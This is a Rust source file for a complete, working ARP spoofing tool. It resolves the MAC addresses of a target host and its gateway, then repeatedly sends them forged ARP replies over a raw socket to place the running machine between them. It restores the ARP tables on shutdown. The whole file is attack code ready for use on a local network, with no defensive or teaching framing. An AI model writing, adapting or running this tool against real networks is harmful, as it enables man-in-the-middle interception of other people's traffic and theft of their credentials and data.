use std::ffi::CString;
use std::io::Write;
use std::mem::{size_of, zeroed};
use std::net::Ipv4Addr;
use std::os::raw::{c_int, c_void};
use std::ptr;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};

// Define Ethernet and ARP constants
const ETH_ALEN: usize = 6;
const ARPHRD_ETHER: u16 = 1;
const ETHERTYPE_IP: u16 = 0x0800;
const ETHERTYPE_ARP: u16 = 0x0806;
const ARPOP_REQUEST: u16 = 1;
const ARPOP_REPLY: u16 = 2;

#[repr(C, packed)]
struct ether_header {
    ether_dhost: [u8; ETH_ALEN],
    ether_shost: [u8; ETH_ALEN],
    ether_type: u16,
}

#[repr(C, packed)]
struct ether_arp {
    ar_hrd: u16,
    ar_pro: u16,
    ar_hln: u8,
    ar_pln: u8,
    ar_op: u16,
    ar_sha: [u8; ETH_ALEN],
    ar_spa: [u8; 4],
    ar_tha: [u8; ETH_ALEN],
    ar_tpa: [u8; 4],
}

static RUNNING: AtomicBool = AtomicBool::new(true);

extern "C" fn signal_handler(_sig: c_int) {
    eprintln!("\n[*] Shutting down...");
    RUNNING.store(false, Ordering::SeqCst);
}

// -------- ioctl request type shim (glibc vs bionic) --------
#[cfg(target_env = "gnu")]
type IoctlReq = libc::c_ulong;
#[cfg(not(target_env = "gnu"))]
type IoctlReq = libc::c_int;

#[repr(C)]
union IfrIfru {
    ifru_addr: libc::sockaddr,
    ifru_hwaddr: libc::sockaddr,
    ifru_flags: libc::c_short,
    ifru_ivalue: libc::c_int,
    ifru_mtu: libc::c_int,
    ifru_data: *mut libc::c_void,
    _pad: [u8; 24],
}

#[repr(C)]
struct Ifreq {
    ifr_name: [libc::c_char; libc::IFNAMSIZ],
    ifr_ifru: IfrIfru,
}

impl Ifreq {
    fn new(iface: &str) -> Result<Self, std::io::Error> {
        if iface.len() >= libc::IFNAMSIZ {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "interface name too long",
            ));
        }
        let mut req: Ifreq = unsafe { zeroed() };
        for (i, b) in iface.as_bytes().iter().enumerate() {
            req.ifr_name[i] = *b as libc::c_char;
        }
        Ok(req)
    }
}

fn get_mac(iface: &str, mac: &mut [u8; 6]) {
    let sock = unsafe { libc::socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if sock < 0 {
        eprintln!("socket(AF_INET) error: {}", std::io::Error::last_os_error());
        return;
    }

    let mut req = match Ifreq::new(iface) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("Ifreq error: {}", e);
            unsafe { libc::close(sock) };
            return;
        }
    };

    // Fix: Cast SIOCGIFHWADDR to IoctlReq to handle u64/i32 differences
    let rc = unsafe { libc::ioctl(sock, libc::SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
    if rc < 0 {
        eprintln!("ioctl SIOCGIFHWADDR error: {}", std::io::Error::last_os_error());
        unsafe { libc::close(sock) };
        return;
    }

    let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
    // Fix: sa_data is [i8], mac is [u8]. We must cast carefully.
    let src_ptr = sa.sa_data.as_ptr() as *const u8;
    unsafe {
        ptr::copy_nonoverlapping(src_ptr, mac.as_mut_ptr(), ETH_ALEN);
    }
    unsafe { libc::close(sock) };
}

fn format_mac(mac: &[u8; 6]) -> String {
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
    )
}

fn send_arp(
    sock: c_int,
    iface: &str,
    src_mac: &[u8; 6],
    dst_mac: &[u8; 6],
    src_ip: u32,
    dst_ip: u32,
    op: u16,
) {
    let mut packet = [0u8; 42];

    let eth = ether_header {
        ether_dhost: *dst_mac,
        ether_shost: *src_mac,
        ether_type: ETHERTYPE_ARP.to_be(),
    };

    let arp = ether_arp {
        ar_hrd: ARPHRD_ETHER.to_be(),
        ar_pro: ETHERTYPE_IP.to_be(),
        ar_hln: ETH_ALEN as u8,
        ar_pln: 4,
        ar_op: op.to_be(),
        ar_sha: *src_mac,
        ar_spa: src_ip.to_be_bytes(),
        ar_tha: *dst_mac,
        ar_tpa: dst_ip.to_be_bytes(),
    };

    unsafe {
        ptr::copy_nonoverlapping(
            &eth as *const _ as *const u8,
            packet.as_mut_ptr(),
            size_of::<ether_header>(),
        );
        ptr::copy_nonoverlapping(
            &arp as *const _ as *const u8,
            packet.as_mut_ptr().add(size_of::<ether_header>()),
            size_of::<ether_arp>(),
        );
    }

    let c_iface = CString::new(iface).unwrap();
    let ifindex = unsafe { libc::if_nametoindex(c_iface.as_ptr()) };
    if ifindex == 0 {
        eprintln!("Failed to get interface index for {}", iface);
        return;
    }

    let mut addr: libc::sockaddr_ll = unsafe { zeroed() };
    addr.sll_family = libc::AF_PACKET as u16;
    addr.sll_ifindex = ifindex as i32;
    addr.sll_halen = ETH_ALEN as u8;
    
    // Fix: sll_addr is [u8; 8], dst_mac is [u8; 6]. Use copy_from_slice.
    addr.sll_addr[..ETH_ALEN].copy_from_slice(dst_mac);

    let sent = unsafe {
        libc::sendto(
            sock,
            packet.as_ptr() as *const c_void,
            packet.len(),
            0,
            &addr as *const _ as *const libc::sockaddr,
            size_of::<libc::sockaddr_ll>() as libc::socklen_t,
        )
    };
    if sent < 0 {
        eprintln!("sendto error: {}", std::io::Error::last_os_error());
    }
}

fn resolve_mac(sock: c_int, iface: &str, ip: u32, mac: &mut [u8; 6]) -> i32 {
    let broadcast: [u8; 6] = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
    let mut src_mac = [0u8; 6];

    get_mac(iface, &mut src_mac);

    let c_iface = CString::new(iface).unwrap();
    let ifindex = unsafe { libc::if_nametoindex(c_iface.as_ptr()) };
    if ifindex == 0 {
        return -1;
    }

    let mut packet = [0u8; 42];
    let eth = ether_header {
        ether_dhost: broadcast,
        ether_shost: src_mac,
        ether_type: ETHERTYPE_ARP.to_be(),
    };

    let arp = ether_arp {
        ar_hrd: ARPHRD_ETHER.to_be(),
        ar_pro: ETHERTYPE_IP.to_be(),
        ar_hln: ETH_ALEN as u8,
        ar_pln: 4,
        ar_op: ARPOP_REQUEST.to_be(),
        ar_sha: src_mac,
        ar_spa: ip.to_be_bytes(),
        ar_tha: [0; 6],
        ar_tpa: [0; 4],
    };

    unsafe {
        ptr::copy_nonoverlapping(
            &eth as *const _ as *const u8,
            packet.as_mut_ptr(),
            size_of::<ether_header>(),
        );
        ptr::copy_nonoverlapping(
            &arp as *const _ as *const u8,
            packet.as_mut_ptr().add(size_of::<ether_header>()),
            size_of::<ether_arp>(),
        );
    }

    let mut addr: libc::sockaddr_ll = unsafe { zeroed() };
    addr.sll_family = libc::AF_PACKET as u16;
    addr.sll_ifindex = ifindex as i32;
    addr.sll_halen = ETH_ALEN as u8;
    
    // Fix: sll_addr is [u8; 8], broadcast is [u8; 6]. Use copy_from_slice.
    addr.sll_addr[..ETH_ALEN].copy_from_slice(&broadcast);

    let sent = unsafe {
        libc::sendto(
            sock,
            packet.as_ptr() as *const c_void,
            packet.len(),
            0,
            &addr as *const _ as *const libc::sockaddr,
            size_of::<libc::sockaddr_ll>() as libc::socklen_t,
        )
    };
    if sent < 0 {
        return -1;
    }

    let mut fds = unsafe { zeroed() };
    unsafe { libc::FD_SET(sock, &mut fds) };
    let mut tv = libc::timeval { tv_sec: 2, tv_usec: 0 };

    if unsafe {
        libc::select(
            sock + 1,
            &mut fds,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut tv,
        )
    } > 0
    {
        let mut from: libc::sockaddr_ll = unsafe { zeroed() };
        let mut fromlen = size_of::<libc::sockaddr_ll>() as libc::socklen_t;
        let mut buf = [0u8; 1024];

        let n = unsafe {
            libc::recvfrom(
                sock,
                buf.as_mut_ptr() as *mut c_void,
                buf.len(),
                0,
                &mut from as *mut _ as *mut libc::sockaddr,
                &mut fromlen,
            )
        };

        if n > 0 {
            let resp_eth = unsafe { &*(buf.as_ptr() as *const ether_header) };
            if resp_eth.ether_type == ETHERTYPE_ARP.to_be() {
                let resp_arp = unsafe {
                    &*(buf.as_ptr().add(size_of::<ether_header>()) as *const ether_arp)
                };
                if resp_arp.ar_op == ARPOP_REPLY.to_be() {
                    let sender_ip = u32::from_be_bytes(resp_arp.ar_spa);
                    if sender_ip == ip {
                        mac.copy_from_slice(&resp_arp.ar_sha);
                        return 0;
                    }
                }
            }
        }
    }

    mac.copy_from_slice(&broadcast);
    -1
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 4 {
        eprintln!("Usage: {} <iface> <target_ip> <gateway_ip>", args[0]);
        eprintln!("Example: {} eth0 192.168.1.100 192.168.1.1", args[0]);
        return Ok(());
    }

    let iface = &args[1];
    let target_ip_str = &args[2];
    let gateway_ip_str = &args[3];

    let target_ip = Ipv4Addr::from_str(target_ip_str)?.to_bits();
    let gateway_ip = Ipv4Addr::from_str(gateway_ip_str)?.to_bits();

    let mut sa: libc::sigaction = unsafe { zeroed() };
    // Fix: Use sa_sigaction and proper casting for Android/Linux compatibility
    sa.sa_sigaction = signal_handler as libc::sighandler_t;
    unsafe { libc::sigemptyset(&mut sa.sa_mask) };
    sa.sa_flags = libc::SA_RESTART; // Use SA_RESTART instead of 0 for better stability
    unsafe {
        libc::sigaction(libc::SIGINT, &sa, ptr::null_mut());
        libc::sigaction(libc::SIGTERM, &sa, ptr::null_mut());
    }

    // Fix: Cast protocol to i32
    let sock = unsafe {
        libc::socket(
            libc::AF_PACKET,
            libc::SOCK_RAW,
            0x0003i32, // ETH_P_ALL
        )
    };
    if sock < 0 {
        return Err(Box::new(std::io::Error::last_os_error()));
    }

    let mut src_mac = [0u8; 6];
    get_mac(iface, &mut src_mac);
    println!("[*] Our MAC: {}", format_mac(&src_mac));
    println!("[*] Interface: {}", iface);

    println!("[*] Resolving MAC addresses...");
    let mut target_mac = [0u8; 6];
    if resolve_mac(sock, iface, target_ip, &mut target_mac) == 0 {
        println!("[*] Target MAC: {}", format_mac(&target_mac));
    } else {
        println!("[!] Could not resolve target MAC, using broadcast");
        target_mac = [0xff; 6];
    }

    let mut gateway_mac = [0u8; 6];
    if resolve_mac(sock, iface, gateway_ip, &mut gateway_mac) == 0 {
        println!("[*] Gateway MAC: {}", format_mac(&gateway_mac));
    } else {
        println!("[!] Could not resolve gateway MAC, using broadcast");
        gateway_mac = [0xff; 6];
    }

    println!("\n[*] Starting ARP spoofing...");
    println!("[*] Target: {}, Gateway: {}", target_ip_str, gateway_ip_str);
    println!("[*] Press Ctrl+C to stop\n");

    let mut count = 0;
    while RUNNING.load(Ordering::SeqCst) {
        send_arp(
            sock,
            iface,
            &src_mac,
            &target_mac,
            gateway_ip,
            target_ip,
            ARPOP_REPLY,
        );
        send_arp(
            sock,
            iface,
            &src_mac,
            &gateway_mac,
            target_ip,
            gateway_ip,
            ARPOP_REPLY,
        );

        count += 1;
        if count % 10 == 0 {
            print!("[*] Sent {} ARP spoofing packets\r", count * 2);
            std::io::stdout().flush().unwrap();
        }

        std::thread::sleep(std::time::Duration::from_secs(1));
    }

    println!("\n[*] Restoring ARP tables...");
    send_arp(
        sock,
        iface,
        &gateway_mac,
        &target_mac,
        gateway_ip,
        target_ip,
        ARPOP_REPLY,
    );
    send_arp(
        sock,
        iface,
        &target_mac,
        &gateway_mac,
        target_ip,
        gateway_ip,
        ARPOP_REPLY,
    );

    unsafe { libc::close(sock) };
    println!("[+] Done.");
    Ok(())
}
